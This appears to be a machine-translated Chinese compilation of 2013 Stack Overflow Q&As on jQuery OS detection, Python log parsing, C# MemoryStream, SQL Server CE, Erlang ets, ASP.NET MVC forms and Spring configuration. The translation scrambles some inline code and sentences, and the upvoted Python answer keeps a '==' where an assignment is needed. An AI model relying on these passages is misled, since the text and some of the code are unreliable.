> 时间：2013-04-01T19:51:32.643

你的`gameOver`方法应该是这样的：

```
Main mMain ;
public void gameOver() throws IOException {
   String message = "Game, Want to try Again?";
   String title = "Game Over";
   int reply = JOptionPane.showConfirmDialog(frame, message, title, JOptionPane.YES_NO_OPTION);
    if (reply == JOptionPane.YES_OPTION){
        frame.dispose();
        frame.setVisible(true);
    } else {
        this.getSoundEffect().stopAllMusic();
        if(mMain==null)
        {
          mMain = new Main();
        }
        mMain.setVisible(true);
    }
} 
```

**编辑**

除了所有这些，你有两个变量，`frame`第一个是实例变量，`frame = new JFrame("Game");`另一个是`final JFrame frame = new JFrame("The Birds Game");`你应该更改其他的变量名`JFrame`。

# javascript - 使用jquery隐藏依赖于操作系统的CSS元素

> ID：15750439
> 
> 赞同：0
> 
> 时间：2013-04-01T19:36:43.083
> 
> 标签：javascript, jquery, css, show-hide

我试图简单地隐藏/显示一个元素，具体取决于您使用的是 mac、windows、iphone、ipad 等。

我有 2 个 p 元素： p1 - 我想在 windows 上显示 p2 - 我想在其他所有东西上显示（mac/iphone/ipad 等）

我在这里找到了一个明显检测操作系统的脚本：http: [//www.stoimen.com/blog/2009/07/16/jquery-browser-and-os-detection-plugin/](http://www.stoimen.com/blog/2009/07/16/jquery-browser-and-os-detection-plugin/)

所以我在链接到 jquery 之后链接到脚本，再加上页面头：

```
if ($.client.os == 'Mac') {
    $('#download').hide(); $('#register').show();
}

if ($.client.os == 'iPhone') {
    $('#download').hide(); $('#register').show();
}

if ($.client.os == 'Windows') {
    $('#download').show(); $('#register').hide();
} 
```

我无法让它工作，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:40:54.393

[该线程](https://stackoverflow.com/questions/7044944/jquery-javascript-to-detect-os-without-a-plugin)对您的问题有一些解决方案。鉴于您指定的属性，您需要做的就是：

```
if (navigator.appVersion.indexOf("Win")!=-1) {
    $('#register').hide();
    $('#download').show();
} 
```

您不需要显式显示元素，因为客户端不会更改操作系统。只需将基本可见性设置为“默认”配置（放入CSS），`#download`并在必要时覆盖它们。`#register``#download { display: none; }``.hide()``.show()`

如果您需要更高级的操作系统检测，您可以通过替换`"Win"`为适当的操作系统标签来添加其他规则。

**编辑**固定 jsFiddle：http: [//jsfiddle.net/2G4pz/5/](http://jsfiddle.net/2G4pz/5/)

# php - 使用 SaveResult 方法时从 PHP OData SDK 检索响应

> ID：15750440
> 
> 赞同：0
> 
> 时间：2013-04-01T19:36:43.860
> 
> 标签：php, http, sdk, odata, odata-php-sdk

我正在使用 PHP Odata SDK ( [http://odataphp.codeplex.com/](http://odataphp.codeplex.com/) )。文档和社区似乎非常有限。

我正在尝试将对象保存到 OData 服务并检索响应。当我执行该方法时，它成功地将对象保存到 OData 服务，但只是返回成功或真结果。它应该返回我刚刚添加的对象的 ID（它确实如此）。

```
$user = Users:CreatUser(array_of_data);
$proxy->AddUser($user);
$proxy->SaveResult(); 
```

如何从 OData 服务检索实际响应？

我努力了：

```
$result = $proxy->SaveResult(); 
```

但这不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:19:49.923

The location of the newly created entry should be returned in the Location header of the response, per the AtomPub specification.

If you were to surf to the location returned by the server in response to a successfully created entry, you should see an entry that looks exactly like the one in the HTTP POST response.

# python - Python - 读取单行/多行文件

> ID：15750445
> 
> 赞同：1
> 
> 时间：2013-04-01T19:36:57.467
> 
> 标签：python

我对 Python 很陌生，我在这里找到了大多数问题的答案，但这个问题让我很困惑。

我正在使用 Python 处理日志文件，通常每一行都以日期/时间戳开头，例如：

```
[1/4/13 18:37:37:848 PST] 
```

在 99% 的情况下，我可以逐行阅读，查找感兴趣的项目并相应地处理它们，但有时日志文件中的条目会包含一条消息，其中包含回车符/换行符，因此它将跨越多个线。

有没有一种方法可以轻松地“在时间戳之间”读取文件，以便在发生这种情况时将多行合并为一次读取？例如：

```
[1/4/13 18:37:37:848 PST] A log entry
[1/4/13 18:37:37:848 PST] Another log entry
[1/4/13 18:37:37:848 PST] A log entry that somehow
got some new line
characters mixed in
[1/4/13 18:37:37:848 PST] The last log entry 
```

将被解读为四行而不是现在的六行。

提前感谢您的帮助。

克里斯，

更新....

myTestFile.log 包含上面的确切文本，这是我的脚本：

```
import sys, getopt, os, re
sourceFolder = 'C:/MaxLogs'
logFileName = sourceFolder + "/myTestFile.log"
lines = []

def timestamp_split(file):
    pattern = re.compile("\[(0?[1-9]|[12][0-9]|3[01])(\/)(0?[1-9]|[12][0-9]|3[01])(\/)([0-9]{2})(\ )")
    current = []
    for line in file:
        if not re.match(pattern,line):
            if current:
                yield "".join(current)
            current == [line]
        else:
            current.append(line)
    yield "".join(current)

print "--- START ----"
with open(logFileName) as file:
    for entry in timestamp_split(file):
        print entry
        print "- Record Separator -"
print "--- DONE ----" 
```

当我运行它时，我得到了这个：

```
--- START ----
[1/4/13 18:37:37:848 PST] A log entry
[1/4/13 18:37:37:848 PST] Another log entry
[1/4/13 18:37:37:848 PST] A log entry that somehow

- Record Separator -
[1/4/13 18:37:37:848 PST] A log entry
[1/4/13 18:37:37:848 PST] Another log entry
[1/4/13 18:37:37:848 PST] A log entry that somehow

- Record Separator -
[1/4/13 18:37:37:848 PST] A log entry
[1/4/13 18:37:37:848 PST] Another log entry
[1/4/13 18:37:37:848 PST] A log entry that somehow
[1/4/13 18:37:37:848 PST] The last log entry
- Record Separator -
--- DONE ---- 
```

我似乎在这些行中迭代了太多次，我期待（希望）的是：

```
--- START ----
[1/4/13 18:37:37:848 PST] A log entry
- Record Separator -
[1/4/13 18:37:37:848 PST] Another log entry
- Record Separator -
[1/4/13 18:37:37:848 PST] A log entry that somehow got some new line characters mixed in
- Record Separator -
[1/4/13 18:37:37:848 PST] The last log entry
- Record Separator -
--- DONE ---- 
```

正如评论中所讨论的，我在测试时不小心将*not*留在了与正则表达式模式的比较中，如果我删除它，那么我会得到所有让我更加困惑的部分行！

```
--- START ----
got some new line
characters mixed in

- Record Separator -
got some new line
characters mixed in

- Record Separator -
--- DONE ---- 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:41:15.083

最简单的方法是实现一个简单的生成器来执行此操作：

```
def timestamp_split(file):
    current = []
    for line in file:
        if line.startswith("["):
            if current:
                yield "".join(current)
            current == [line]
        else:
            current.append(line)
    yield "".join(current) 
```

自然地，这假设`"["`在一行的开头足以表示时间戳 - 您可能想要进行更重要的检查。

然后只需执行以下操作：

```
with open("somefile.txt") as file:
    for entry in timestamp_split(file):
        ... 
```

（这里使用[语句- 打开文件](http://www.youtube.com/watch?v=lRaKmobSXF4&)[的`with`](http://www.youtube.com/watch?v=lRaKmobSXF4&)好习惯。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:42:58.690

```
import re

lines = []
pattern = re.compile('\[\d+/\d+/\d+\s\d+:\d+:\d+\s\w+\]')
with open('filename.txt', 'r') as f:
    for line in f:
        if re.match(pattern, line):
            lines.append(line)
        else:
            lines[-1] += line 
```

这将时间戳与正则表达式匹配。可以根据需要进行调整。它还假设第一行包含一个时间戳。

# c# - System.IO 命名空间中 MemoryStream 类的相关性

> ID：15750451
> 
> 赞同：-4
> 
> 时间：2013-04-01T19:37:11.050
> 
> 标签：c#, .net, memory-management

刚刚想到为什么 System.IO 命名空间中存在 MemoryStream 类？

鉴于 System.IO 都是关于对磁盘等的输入/输出操作，并且 MemoryStream 将存储在内存中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:41:26.513

> 鉴于 System.IO 都是关于对磁盘等的输入/输出操作

不，`System.IO`都是关于输入/输出操作的，从这个意义上讲，从内存流中写入或读取仍然是 IO。

这么说吧：如果您将文件保存到 a `MemoryStream`，那不是保存操作的*输出吗？*如果从 加载 XML 文档`MemoryStream`，那不是解析器的*输入吗？*

[命名空间文档](http://msdn.microsoft.com/en-GB/library/system.io.aspx)指出：

> System.IO 命名空间包含允许读取和写入文件和数据流的类型，以及提供基本文件和目录支持的类型。

在你看来是`MemoryStream`不是“数据流”？如果不是，为什么不呢？

为什么要*放入*命名空间`MemoryStream`？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:39:13.117

有时您想使用一种将 a`Stream`作为输入的方法，但您没有文件/网络/任何流来提供它。在这种情况下，您创建一个`MemoryStream`提供接口，用于将数据写入字节数组包装器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T19:58:35.073

我支持上面尊敬的 Jon Skeet 的回答，但我会添加更多的推理。

由于大多数用于操作数据流的编码操作都在 System.IO.Stream 抽象类（不能直接实例化）上操作，因此所有这些操作都将与从 System.IO.Stream 继承的任何东西兼容，例如System.IO.FileStream 或 System.IO.BufferedStream。这对我们开发人员来说非常棒——我们可以在任何我们喜欢的地方开发处理数据的软件，只要存储介质有一个兼容的 System.IO.Stream 继承类来处理 IO。我希望你会同意文件系统访问等*应该*存在于 System.IO 中。

但是，即使您*确实*认为内存不是真正的 IO（我不同意），System.IO.MemoryStream 类仍然继承 System.IO.Stream，并提供了一种漂亮且一致的方式来做同样的事情您可以使用 System.IO.FileStream 来处理文件，而只是使用临时内存存储。

正如 Jon 所说，既然它继承自 System.IO.Stream，并为数据的输入和输出提供了一个抽象的内存支持存储，那么您会将它放在哪里呢？

# c# - SDF 本地数据库连接错误：40

> ID：15750458
> 
> 赞同：0
> 
> 时间：2013-04-01T19:37:32.507
> 
> 标签：c#, sql, sql-server-ce, named-pipes

您好我正在尝试连接到`.sdf`Windows 窗体项目中的本地 SQL Server Compact 数据库 ()，并且已经面临这个问题很长一段时间了。我不允许在项目中使用数据集，所有查询和连接都写在应用程序中。

> System.Data.SqlClient.SqlException
> 
> 建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：命名管道提供者，错误：40 - 无法打开与 SQL Server 的连接）

代码：

```
SqlConnection _Connection = new SqlConnection(ConfigurationManager.ConnectionStrings["restaurant"].ToString());
SqlCommand _Command = _Connection.CreateCommand();

_Connection.Open(); // <- throws exception 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:41:04.040

要连接 Sql Server Compact，您需要[命名空间 SqlServerCe](http://msdn.microsoft.com/en-us/library/system.data.sqlserverce%28v=vs.100%29.aspx)中包含的一组不同的类（SqlCeConnection、SqlCeCommand 等......）

```
SqlCeConnection _Connection = new SqlCeConnection(ConfigurationManager.ConnectionStrings["restaurant"].ToString());
SqlCeCommand _Command = _Connection.CreateCommand();
_Connection.Open(); 
```

当然，您需要引用包含上述类的程序集。

```
 System.Data.SqlServerCe.dll (ADO.NET provider) 
```

并添加 using 语句

```
 using System.Data.SqlServerCe; 
```

# mysql - MySQL中的主键

> ID：15750464
> 
> 赞同：0
> 
> 时间：2013-04-01T19:37:46.763
> 
> 标签：mysql, composite-primary-key, create-table

我正在尝试从现有表创建一个表。现有表中的主键会转移到新表吗？

创建表 B 作为从 A 中选择 column1、column2、column3。

在表 A 中，主键是 column1 和 column2。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:39:24.427

> `CREATE TABLE ... SELECT`不会自动为您创建任何索引。这样做是为了使语句尽可能灵活。如果你想在创建的表中有索引，你应该在`SELECT`语句之前指定这些：
> 
> ```
> mysql> CREATE TABLE bar (UNIQUE (n)) SELECT n FROM foo; 
> ```

[文档](http://dev.mysql.com/doc/refman/5.1/en/create-table-select.html)

# erlang - ets:match 不返回预期值

> ID：15750469
> 
> 赞同：3
> 
> 时间：2013-04-01T19:38:16.853
> 
> 标签：erlang, ets

我在使用 ets:match 时遇到问题。在下面的代码中，我希望 ets:match 返回 1 个找到的值，但没有返回任何值。为什么 ？

```
1> T = ets:new(xxx, []).
16400
2> ets:insert(T, {a, b, c, d}).
true
3> ets:match(T, {'_', '_', '_', '_'}).
[[]] 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-01T20:21:59.400

您可能想要[ets:match_object/2](http://www.erlang.org/doc/man/ets.html#match_object-2)代替：

```
> ets:match_object(T, {'_', '_', '_', '_'}).
[{a,b,c,d}] 
```

使用[ets:match/2](http://www.erlang.org/doc/man/ets.html#match-2)时，模式应该包含一些原子，例如`'$1'`,`'$2'`等等。结果将是一个列表列表，其中每个子列表将包含按魔术原子给定顺序的相应元素。例如，要以相反的顺序获取最后三个元素：

```
> ets:match(T, {'_', '$3', '$2', '$1'}).
[[d,c,b]] 
```

由于您没有在匹配中使用任何此类原子，因此每次匹配都返回零个元素；因此该列表包含一个空列表，`[[]]`。

# asp.net-mvc - 表单上的两个提交按钮

> ID：15750471
> 
> 赞同：0
> 
> 时间：2013-04-01T19:38:23.043
> 
> 标签：asp.net-mvc, asp.net-mvc-3, razor, asp.net-mvc-4

假设我有一组机构，每个机构都知道他的父亲是谁，一个机构可以有很多孩子。现在我为这个问题创建了一组级联下拉列表，所以在第一个找到没有父亲的下拉列表（如果可能的话，第 0 层），一旦用户选择了一个项目，第二个列表上的列表就会加载它的孩子（如果它有任何孩子）等等，直到第 3 层，这是我的代码：

索引.cshtml：

```
@model  WebUI.Controllers.IndexViewModel
<script src="@Url.Content("~/Scripts/jquery-1.7.1.min.js")" type="text/javascript">  </script>
<script src="@Url.Content("~/Scripts/jquery.unobtrusive-ajax.min.js")" type="text/javascript"></script>

 @Html.Partial("ParentEstablishments",Model)
 <div id="FirstHeritage">@Html.Partial("FirstHeritageChildren",Model)</div>
 <div id="SecondHeritage">@Html.Partial("SecondHeritageChildren",Model)</div> 
```

每个局部视图都有一个 ajax 形式，如下所示：

```
@model WebUI.Controllers.IndexViewModel

@using (Ajax.BeginForm("SelectParent","Ticket",new   AjaxOptions{UpdateTargetId="FirstHeritage"}))
{

 <fieldset>
    <legend>Entidad departamental</legend>

    @Html.DropDownListFor( 
        m => m.SelectedParentId , 
        new SelectList( Model.AvailableParents , "EstablishmentId" , "Name" ) , 
        "[Por favor seleccione una entidad departamental]" 
    )
    <input type="submit" value="Select" />
</fieldset>
} 
```

所以我想要创建的是一个提交按钮，让用户告诉我他选择了他需要的实体，并在我的控制器上调用一个方法，在那里我检查每个 id 的值，我试图将部分视图放在表单中但是ajax表单的每个提交按钮都会调用我创建的表单的方法，我**怎样才能在不干扰ajax表单的情况下制作一个按钮？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:46:39.200

你不能，基本上。使 AJAX 表单成为 AJAX 表单的脚本绑定到提交事件，因此任何提交都会被捕获。

请记住，ASP.NET 中的所有 HTML 帮助程序和控件都是为了涵盖*常见*场景并在您实际处于常见场景中时让您的生活更轻松。您的代码获得的“自定义”越多（例如将执行常规 POST 而不是 AJAX POST 的第二个提交按钮），您需要做的工作就越多（并且您应该使用内置帮助程序和控件的次数越少）。

只需创建一个常规表单 ( `Html.BeginForm`)，添加两个提交按钮，然后在 AJAX 版本上附加一个单击事件，然后自己将 POST 作为 AJAX 发送。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T07:25:41.403

**像下面这样修改按钮。**

```
<input type="button" value="Select" class="btnSubmit" /> 
```

**修改表单标签，如下所述**

```
@using (Ajax.BeginForm("SelectParent","Ticket", FormMethod.Post, 
                                                          new { id = "myForm" }))
{
} 
```

**如下所述修改 Div。添加一个属性，该属性的值对应于控制器的 Action 方法。**

```
<div id="FirstHeritage" attr-Url="@Url.Action("ActionName", "ControllerName", 
new { area = "AreaName" })"></div> 
```

**现在在 Jquery 中。请按照以下步骤操作。**

1.  加载局部视图
2.  获取 Div 属性值
3.  将 On 用于 Button 事件。
4.  阿贾克斯请求

* * *

**jQuery**

```
$(document).ready(function () {
    var FirstHeritage = $('#FirstHeritage');
    var url = FirstHeritage.attr('attr-Url');
    FirstHeritage.load(url, function () {
        var $form = $('#myForm');
        $.validator.unobtrusive.parse($form);
        $(document).on('click', '.btnSubmit', function () {
            if ($form.valid()) {
                $.ajax({
                    url: Url,
                    async: true,
                    type: 'POST',
                    beforeSend: function (xhr, opts) {

                    },
                    contentType: 'application/json; charset=utf-8',
                    complete: function () { },
                    success: function (data) {
                        $form.html(data);
                        $form.removeData('validator');
                        $form.removeData('unobtrusiveValidation');
                        $.validator.unobtrusive.parse($form);
                    }
                });
            }
        });
    });
}); 
```

希望这会帮助你。

# asp.net - 允许屏蔽的电子邮件服务建议

> ID：15750478
> 
> 赞同：1
> 
> 时间：2013-04-01T19:38:43.020
> 
> 标签：asp.net, email, smtp

作为一名开发人员，我多次遇到的一件事是，当网站需要通过电子邮件与自动回复器响应用户交互时。挂断通常是试图让非技术人员为我提供发送电子邮件所需的设置。

我个人使用 gmail 业务服务并拥有一个开发电子邮件帐户。垮台，经过研究，似乎gmail不允许您更改发件人电子邮件地址。

**我正在寻找允许屏蔽来自电子邮件地址和显示名称的电子邮件服务的建议。或者从技术上讲，我不知道还有另一种解决方案。**

*这是我通常使用的代码：*

```
// Create message
MailMessage message = new MailMessage();

if (!string.IsNullOrEmpty(toAddress))
    {
         message.To.Add(toAddress);
    }

    message.Body = body;
    message.BodyEncoding = System.Text.Encoding.UTF8;
    message.Subject = subject;
    message.SubjectEncoding = System.Text.Encoding.UTF8;
    message.IsBodyHtml = true;
    try
        {
            SmtpClient client = new SmtpClient();
            client.Send(message);
        }
        catch (Exception exp)
        {
            throw (exp);
        }
        finally
        {
            message.Dispose();
        }
    return true;
} 
```

# javascript - .focus() 不起作用，因为尚未加载动态表 - JQUERY

> ID：15750483
> 
> 赞同：2
> 
> 时间：2013-04-01T19:39:04.703
> 
> 标签：javascript, jquery, ajax, datatables

我正在使用来自 AJAX 调用的数据动态创建一个表。我正在使用“选择/下拉框”.on('change') 函数将值发送到我的 PHP。表格显示后，我想将焦点设置在表格上动态创建的搜索框上。

问题似乎在于，由于表格需要几秒钟才能可见，因此 .focus() 命令会在表格可见之前触发。我希望在创建表函数完成后触发 .focus() 命令。

Javascript/Jquery 代码：

```
$('#t6F3Box1').on('change', function()
    {   
        var $newTable ='<table id="tempEmployerTbl" class="studentTables"><thead><tr>';
        var $searchStr=new RegExp("ID");
        var $tableContainerDiv="#t6F3TableCont";
        var $rowFlag=0;
        var $responseDataValue=[]
        var $employerState=$('#t6F3Box1').val();
        var $getTableDataPhp="../application/employer.php";
        var $data=[];

            $('#t6F3ErrDiv').text('');
            $('#t6F3TableCont, #t6F3HLine2, #t6F3HLine2').show();

        $data += "&employerState=" + encodeURIComponent($employerState);

        $.ajax({
        type: 'POST',
        async: false,
        url:  $getTableDataPhp,
        cache: false,
        datatype: 'json',
        data: $data,
        success: function($responseData)
        {

            //Loop through the responsdata returned in a JSON Array
            //dynamically create the Employer drop down box 
            if (!$responseData.authenticationError)
            {
                    //Create the header for the Employer Table
                    $.each($responseData, function($key, $value) 
                    {
                        if($rowFlag==0)
                        {
                            $responseDataValue=$responseData[$key];
                            $.each($responseDataValue, function($keys, $values)
                            {
                                if ($searchStr.test($keys))
                                {

                                    $newTable += '<th class="tableDataHide">'  + $keys + '</th>';

                                }
                                    else
                                {

                                    $newTable += '<th class="tableDataShow">'  + $keys + '</th>'
                                }           

                            });
                            $rowFlag=1;
                        }
                    });
                $newTable +='</tr></thead><tbody>';

                //Create the body for the Employer Table
                $.each($responseData, function($key, $value) 
                {
                    $newTable +=  '<tr>'
                    $responseDataValue=$responseData[$key];
                    $.each($responseDataValue, function($keys, $values)
                    {   
                        if ($searchStr.test($keys))
                        {

                            $newTable += '<td class="tableDataHide">'  + $values + '</td>';

                        }
                            else
                        {
                            if($values==null)
                            {
                                $values="";
                            }
                            $newTable += '<td class="tableDataShow">'  + $values + '</td>'
                        }           

                    }); 

                    $newTable +='</tr>';

                }); 

                $newTable +='</tbody></table>';
                $($tableContainerDiv).html($newTable); 

                $("#tempEmployerTbl").dataTable();
$('#tblSearchBox').focus();

            }               
        }
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:40:57.140

我看不到您`.focus`在示例中甚至调用的位置，但解决方案只是在`$($tableContainerDiv).html($newTable);`-- 即在它被 ajax 回调附加之后调用它。

# ios - 如何在 Google Drive 中查询根文件夹中具有已知名称的文件夹的 ID（Google Drive SDK for iPhone）？

> ID：15750484
> 
> 赞同：11
> 
> 时间：2013-04-01T19:39:07.457
> 
> 标签：ios, objective-c, google-drive-api

有查询

`GTLQueryDrive *queryFilesList = [GTLQueryDrive queryForChildrenListWithFolderId:@"root"];`

我得到了根文件夹中的所有内容：文件和文件夹。当然，我可以在`GTLDriveChildList`返回的文件夹中查找。但是根文件夹可以有数千个项目，我只需要其中一个。我尝试了窄搜索。评论`GTLQueryDrive.h`说有可能。我试过了

`queryFilesList.q = @"mimeType='application/vnd.google-apps.folder'";`

仅查询文件夹或

`queryFilesList.q = [NSString stringWithFormat:@"title='%@'", folderName];`

按名称查询所有项目。两个查询都返回空列表。*仔细检查：我寻找的文件夹确实存在。*

我试过了

```
GTLQueryDrive *queryFilesList = [GTLQueryDrive queryForFilesList]; 
```

它适用于

```
queryFilesList.q =  @"mimeType='audio/x-aiff'"; 
```

但是如果我尝试只查询文件夹，则返回空列表

```
queryFilesList.q =  @"mimeType='application/vnd.google-apps.folder'"; 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T22:10:32.353

我是自私的白痴！

```
GTLQueryDrive *queryFilesList = [GTLQueryDrive queryForChildrenListWithFolderId:@"root"];
queryFilesList.q = @"mimeType='application/vnd.google-apps.folder'"; 
```

工作得很好，但它只看到用这个应用程序创建的文件夹！那是我的问题。确切地说，您可以使用以下查询：

```
queryFilesList.q = @"mimeType='application/vnd.google-apps.folder' and 'root' in parents and trashed=false"; 
```

`trashed=false`如果您不想找到被丢弃的物品，这一点很重要。

# javascript - 如何通过倒计时更改边距值？

> ID：15750488
> 
> 赞同：0
> 
> 时间：2013-04-01T19:39:10.907
> 
> 标签：javascript, jquery, timer, margin, countdowntimer

有人能帮我解决这个问题吗？

这是我现在拥有的 [http://jsfiddle.net/fergu0516/GAVDA/](http://jsfiddle.net/fergu0516/GAVDA/)

```
 var leave = 200;
        if(leave > 0)
        {
            CounterTimer();
        }
        function CounterTimer() 
        {
        var minute = Math.floor(leave / 60);
        var second = Math.floor(leave) - (minute*60);            
        minute=minute<10 ? "0" + minute : minute; 
        second=second<10 ? "0" + second : second;

        var remain = minute + ":" + second;
        leave = leave-1 ;
        document.getElementById("clkTimer").innerHTML = remain;            

        if(leave >= 0)
          {
              setTimeout(CounterTimer,1000);
          }
        else
          {
            alert("Your cart is expired!")
            window.location = "#";                
          }
        }
    $(document).ready(function(){

// The relative URL of the submit.php script.
// You will probably have to change it.

// Caching the feedback object: 
var feedback = $('#feedback');

$('#feedback').click(function(){

    // We are storing the values of the animated
    // properties in a separate object:

    var anim    = {     
        mb : 207,           // Margin Bottom
        pt : 0          // Padding Top
    };

    var el = $(this).find('.arrow');

    if(el.hasClass('buttonright')){
        anim = {
            mb : 0,
            pt : 0
        };
    }

    // The first animation moves the form up or down, and the second one 
    // moves the "Feedback heading" so it fits in the minimized version

    feedback.stop().animate({marginRight: anim.mb});

    feedback.find('.section').stop().animate({paddingTop:anim.pt},function(){
        el.toggleClass('buttonright buttonleft');
    });
});

    }); 
```

我需要具有与示例相同的效果：现在发生的情况是，当我按下红色框时，计时器会通过为 (div id="feedback") 提供 207px 的边距来显示。

我需要的是当时间达到 1:00 时自动发生这种情况。因此，当计时器达到 1:00 时，窗口将显示，通过将 margin-right:207px 添加到对象。

非常感谢，任何事情都会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:50:59.653

# [演示](http://jsfiddle.net/mohammadAdil/uWBUT/#fork)

做这样的事情：

```
 if(leave == 60){
        $('#feedback').trigger('click');
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:50:35.937

添加

```
if (leave == 60)
{
   $('#feedback').stop().animate({marginRight: 207});   
} 
```

到`CounterTimer()`功能。可能在`leave = leave - 1;`线路之后。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T19:42:42.087

您需要做的就是添加一个`if`语句来找出`if(leave == 60)`，如果是这样，您就可以将元素设置为“可见”`margin-right`值。

# c# - C# 中有没有办法让“浏览器”预处理 WebRequest，以便您可以使用“查看源代码”时看到的元素

> ID：15750490
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:39:15.353
> 
> 标签：c#, httprequest, webrequest, stocks

我想向例如[http://finance.yahoo.com/q?s=rb.l](http://finance.yahoo.com/q?s=rb.l)发出网络请求并提取股价。然而，返回的文本是在浏览器处理它之前`<span></span>`，我需要在我需要查找的元素存在之前先处理它。

这是可能的，还是我应该考虑用另一种方式来做？

类似地，任何可靠的 15 分钟延迟免费股票服务为 LSE 或仅给出股票代码的其他获取此数据的方式都会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:56:27.380

这里有两个问题：首先，如何在允许 javascript 等在该页面上运行后以编程方式访问页面上的数据，就好像它正在被真正的浏览器读取一样。其次，如何以编程方式获取股票代码信息。

要回答第一个问题：您可以使用 WebDriver .NET 之类的东西来逐字地实例化打开页面的浏览器，然后访问页面上的元素。

要回答第二个问题，我建议您尝试[直接搜索该问题](https://www.google.com/search?q=stock%20quote%20service%20api)，因为这是一个足够常见的问题，您可能会找到[很多人](https://stackoverflow.com/questions/527703/how-can-i-get-stock-quotes-using-google-finance-api)已经回答过它。

# backbone.js - Kentico CMS + Backbone.js

> ID：15750498
> 
> 赞同：1
> 
> 时间：2013-04-01T19:40:36.730
> 
> 标签：backbone.js, content-management-system, web-frameworks, kentico

我已经看到一些关于将 Backbone.js 与 CMS 一起使用的参考资料。我将很快开始一个使用 Kentico CMS 的新项目。我想将 Backbone.js 用于客户端框架，以制作通过 Kentico 管理其内容的“Web 应用程序”体验（类似于 Backbone 在其网站上为[USAToday](http://usatoday.com)提供的示例）。

有没有人这样做过？由于 Kentico 的 web 框架，这似乎很困难。我确信这是可能的，但代价是什么？Kentico 方面会丢失哪些功能？内容管理器是否仍然能够更改布局、重新排列 Web 部件、添加/删除 Web 部件、更新 Web 部件中的内容、添加/删除页面？

任何帮助或示例都会很棒！谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T07:21:55.707

Kentico CMS 带有[一个 RESTful API](http://devnet.kentico.com/docs/devguide/rest_data_retrieval_methods.htm)，能够操作系统中的所有对象和文档。所以这取决于你在客户端实现什么。如果您想实现推送功能，您可能需要使用[SignalR](http://signalr.net/)（WebSockets 的 ASP.NET 封装）。有一个很好的库可以提供 Backbone.js 和 SignalR 之间的通信，称为[Backbone.signalr](https://github.com/SrtSolutions/backbone.signalr)。您应该看看的最后一件事是Kentico CMS 7 中引入[的新事件系统，](http://devnet.kentico.com/docs/devguide/event_handlers_overview.htm)能够连接到任何文档或对象更改。

# java - 如何配置 ContextLoaderListener 不查找 applicationContext.xml

> ID：15750500
> 
> 赞同：1
> 
> 时间：2013-04-01T19:40:43.740
> 
> 标签：java, spring, jersey, grizzly

我试图在我的应用程序中避开基于 XML 的配置，并希望在代码中维护所有配置。目前正在`org.springframework.web.context.ContextLoaderListener`寻找`applicationContext.xml`.

我可以将其关闭以使其不需要该文件吗？

目前 main() 看起来像这样......

```
public static void main(String[] args) throws IOException {
    final HttpServer server = HttpServer.createSimpleServer(".", 8181);

    WebappContext ctx = new WebappContext("Socket", "/");

    //allow spring to do all of it's stuff
    ctx.addListener("org.springframework.web.context.ContextLoaderListener");

    //enable web socket support
    final WebSocketAddOn addon = new WebSocketAddOn();
    for (NetworkListener listener : server.getListeners()) {
        listener.registerAddOn(addon);

        //if false, local files (html, etc.) can be modified without restarting the server
        //@todo experiment with this setting in production vs development
        listener.getFileCache().setEnabled(false);
    }

    //add jersey servlet support
    /*ServletRegistration jerseyServletRegistration = ctx.addServlet("JerseyServlet", new ServletContainer());
    jerseyServletRegistration.setInitParameter("com.sun.jersey.config.property.packages", "come.fettergroup.production.queue.resources");
    jerseyServletRegistration.setLoadOnStartup(1);
    jerseyServletRegistration.addMapping("/api/*");*/

    //add atmosphere servlet support
    AtmosphereServlet atmosphereServlet = new AtmosphereServlet();
    AtmosphereFramework f = atmosphereServlet.framework();

    ReflectorServletProcessor r = new ReflectorServletProcessor();
    r.setServletClassName("com.sun.jersey.spi.spring.container.servlet.SpringServlet");

    f.addAtmosphereHandler("/socket/*", r);

    ServletRegistration atmosphereServletRegistration = ctx.addServlet("AtmosphereServlet", atmosphereServlet);
    atmosphereServletRegistration.setInitParameter("org.atmosphere.websocket.messageContentType", "application/json");
    atmosphereServletRegistration.setInitParameter("com.sun.jersey.api.json.POJOMappingFeature", "true");
    atmosphereServletRegistration.setLoadOnStartup(1);

    ctx.deploy(server);

    //serve static assets
    StaticHttpHandler staticHttpHandler = new StaticHttpHandler("src/main/web");
    server.getServerConfiguration().addHttpHandler(staticHttpHandler, "/");

    //start the production process
    Production.init();

    server.start();

    System.in.read();
    server.stop();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:58:03.200

还没有尝试过，但是需要将 org.springframework.web.context.ContextLoaderListener 类配置为使用注释扫描应用程序上下文。这是通过上下文参数完成的。

所以在 web.xml 文件中，你会做这样的事情：

```
 <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>com.yourbasepackage</param-value>
    </context-param>

    <context-param>
        <param-name>contextClass</param-name>
        <param-value>org.springframework.web.context.support.AnnotationConfigWebApplicationContext</param-value>
    </context-param> 
```

